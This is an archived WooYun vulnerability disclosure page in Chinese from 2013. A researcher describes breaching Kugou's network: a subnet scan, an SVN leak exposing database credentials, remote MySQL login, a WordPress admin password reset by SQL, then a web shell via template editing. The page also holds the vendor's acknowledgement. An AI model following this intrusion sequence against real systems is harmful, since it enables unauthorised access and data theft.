@@ -1,0 +1,284 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		酷狗可被轻易渗透漏洞暴露脆弱安全架构  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		酷狗可被轻易渗透漏洞暴露脆弱安全架构  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/nightwi3h">nightwi3h</a> 
+</li><li>提交时间：		2013-05-13 09:23</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-05-13：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-05-13：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-05-23：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-06-02：	细节向普通白帽子公开<br/>
+									2013-06-12：	细节向实习白帽子公开<br/>
+									2013-06-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">今天上百度准备看一集火影睡了，没成想tudou被劫持了。-_-||!<br />
+打开酷狗音乐吧，听听现场主播哼几首就睡了，结果木钱钱。-_-||!<br />
+那就进去看看吧！Let&#039;s Go!~Ps：xsser我想问一句，Rank有木有40 60?<br />
+（鉴于对酷狗整体架构持久影响，详细说明做了模糊处理，未模糊版本联系nightwi3h@qq.com索取）</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">No.0 分析判断：<br />
+<br />
+　　酷狗作为以流媒体服务为主的厂商，肯定不少CDN、分发负载、P2P管理之类的服务器，作为木钱钱的人士，还是奔内网数据库去吧！<br />
+<br />
+　　难点在于如何抛开酷狗大量的CDN找到脆弱的系统边界。<br />
+<br />
+No.1 搜集信息：<br />
+<br />
+　　于是乎，Google墙的太厉害，借助度娘吧。找到两个比较目测没有加CDN的域名：xxx1.kugou.com[113.106.x.x3] xxx2.kugou.com [183.60.x.x] 183.60段比较熟悉，作为一个业余的安全运维，这个段很多高防，当然CDN也比较多，放弃吧。<br />
+<br />
+　　扫描下113.106.x.x3/24吧：(仅仅留下后续有用的结果)<br />
+<br />
+　　</p><pre><code>113.106.x.x1 H3C Router<br />
+　　113.106.x.x3 3306<br />
+　　113.106.x.x7 3306<br />
+　　113.106.x.x9 3306<br />
+　　113.106.x.x9 80</code></pre><p class='detail'><br />
+<br />
+　　分析：看来H3C后面都是酷狗的了，重点关注一下吧:)<br />
+<br />
+　　挂上SRCWVS[http://www.srcwork.com] 扫描一下Web吧，轻易获得一个SVN源码泄露：http://113.106.x.x9/admin/x/xfig/.svn/text-base/test.inc.php.svn-base <br />
+<br />
+</p><pre><code>　　$dbConfig[&#039;default&#039;] = array(<br />
+　　	&#039;DB_TYPE&#039; =&gt; &#039;mysql&#039;,<br />
+　　	&#039;DB_CHARSET&#039; =&gt; &#039;utf8&#039;,<br />
+　　	&#039;DB_PERSISTENT&#039; =&gt; false,<br />
+　　	&#039;DB_HOST&#039;=&gt;&#039;10.10.10.7&#039;,<br />
+　　	&#039;DB_USER&#039;=&gt;&#039;admin&#039;,<br />
+　　	&#039;DB_PASSWD&#039;=&gt;&#039;jjxx&#039;,<br />
+　　	&#039;DB_NAME&#039;=&gt;&#039;mv&#039;,<br />
+　　);<br />
+　　//推荐数据库配置。<br />
+　　$dbConfig[&#039;tuijian&#039;] = array(<br />
+　　	&#039;DB_TYPE&#039; =&gt; &#039;mysql&#039;,<br />
+　　	&#039;DB_CHARSET&#039; =&gt; &#039;utf8&#039;,<br />
+　　	&#039;DB_PERSISTENT&#039; =&gt; false,<br />
+　　	&#039;DB_HOST&#039;=&gt;&#039;10.10.10.3&#039;,<br />
+　　	&#039;DB_USER&#039;=&gt;&#039;outtransql&#039;,<br />
+　　	&#039;DB_PASSWD&#039;=&gt;&#039;xxoo&#039;,<br />
+　　	&#039;DB_NAME&#039;=&gt;&#039;tuijian&#039;<br />
+　　</code></pre><p class='detail'><br />
+<br />
+　　（获得酷狗PHP框架源码和内网数据库连接信息）<br />
+<br />
+　　No.3：分析：x9这台源码应该是酷狗自己开发的PHP框架，安全性还不错，简单的Code漏洞基本上没啥，不过最想的先取个BashShell。既然框架不能利用，数据库在内网。咋办呢？瓶颈来了。给我一首歌的时间。哦，懂了这种开发测试机一般都会写距离本机不远的数据库，试试人品？<br />
+<br />
+　　No.4:数据库新发现：<br />
+<br />
+</p><pre><code>　　10.10.10.7 10.10.10.3 10.10.10.9<br />
+　　113.106.x.x7 113.106.x.x3 113.106.x.x9</code></pre><p class='detail'><br />
+<br />
+　　懂了，这种貌似是3306没防火外联了<br />
+<br />
+　　Cmd&gt;mysql -h 113.106.x.x3 -u outtransql -p<br />
+<br />
+　　<br />
+<br />
+　　Bingo! 数据库OK！<br />
+<br />
+</p><pre><code>　　mysql&gt; show databases;<br />
+　　+--------------------+<br />
+　　| Database           |<br />
+　　+--------------------+<br />
+　　| information_schema |<br />
+　　| StandardMusic      |<br />
+　　| UnStandardMusic    |<br />
+　　| cloud              |<br />
+　　| cr_debug           |<br />
+　　| imagesetting       |<br />
+　　| ios_jingpin        |<br />
+　　| jinzhj             |<br />
+　　| klok               |<br />
+　　| kml                |<br />
+　　| kugou01            |<br />
+　　| kugoublog          | <br />
+　　+--------------------+<br />
+　　32 rows in set</code></pre><p class='detail'>　　<br />
+<br />
+　　数据库很多，用户权限都是root，都允许远程登录(我有预感，这回酷狗悲剧了-_-||)<br />
+<br />
+　　<br />
+<br />
+　　No.5寻找数据库突破目标：<br />
+<br />
+　　经过以上测试后，连接上的几个数据库内容丰富，但是如何能利用数据库进入酷狗内网呢？对了，就你了，KugouX库，看内容是个WordPress的Blog，恩不错。<br />
+<br />
+　　果断X.kugou.com 原来是个未完工的Blog，好吧，别怪我了。<br />
+<br />
+</p><pre><code>　　update kg_users set user_pass=&#039;21232f297a57a5a743894a0e4a801fc3’ where user_login=&#039;Xadmin&#039;;</code></pre><p class='detail'><br />
+<br />
+　　登录-改模板-获取BashShell OK！<br />
+<br />
+　　<br />
+<br />
+　　No.6：简单的架构分析：<br />
+<br />
+　　Web几个报错可以判定：酷狗用的是NFS（或者其他网络文件系统）/data0 /data1 /data2<br />
+<br />
+　　好吧：<br />
+<br />
+</p><pre><code>　　[/data2/www.kugou.com/]$ ls<br />
+　　2012<br />
+　　clientshare<br />
+　　common<br />
+　　default.html<br />
+　　download<br />
+　　fm2<br />
+　　..........<br />
+　　yueku<br />
+　</code></pre><p class='detail'><br />
+<br />
+　　Ps:看来该收手了，点到为止吧，改首页什么的不是我的菜！（顺道BS一下那个劫持土豆的，我都搞定了，我的DNS Flush的N+1次居然还没好，你娃是不是改了别人NS哦- -）<br />
+<br />
+　　最后说几句：除了PHPShell，其他动过的都改回来了。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/1304345985e8d1056ca2d495a693b76cf1996f3a.png" target="_blank"><img src="../images/1304345985e8d1056ca2d495a693b76cf1996f3a.png" alt="00.png" width="600"/></a></p><p class="detail"><br />
+<br />
+有图有WB </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">　　想听我说吗？No.1.2.3.4.5.6.7.8.9.N(Ps:不是我懒，太晚了睡了，明天学校坑爹的数电考试啊 - -悲剧。)这个修复方案可以写成一整套方案了（前提是比较了解酷狗架构之后）就暂时不写了。<br />
+<br />
+祝你们把酷狗做的更好！我是忠实用户。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/nightwi3h" title="nightwi3h">nightwi3h</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-023605" title="酷狗可被轻易渗透漏洞暴露脆弱安全架构">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2013-05-13 09:37</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">我只能说碉堡了，感谢对酷狗的关注。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="23605";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
